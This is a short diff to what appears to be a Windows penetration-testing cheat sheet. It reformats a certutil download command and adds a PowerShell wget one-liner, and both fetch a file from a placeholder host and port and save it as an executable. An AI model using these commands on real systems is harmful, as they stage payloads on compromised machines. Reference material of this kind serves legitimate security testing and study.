@@ -77,7 +77,8 @@ dir /a:h `show only hidden files`<br/>
 
 ### Downloading Files
 
-certutil.exe -urlcache -f http://<ip>:<port>/<file> ouput.exe
+`certutil.exe -urlcache -f http://<ip>:<port>/<file> ouput.exe`<br />
+`powershell -c "wget http://<ip>:<port>/<file>" -outfile output.exe`
 
 # Msfvenom
 ### List All Payloads
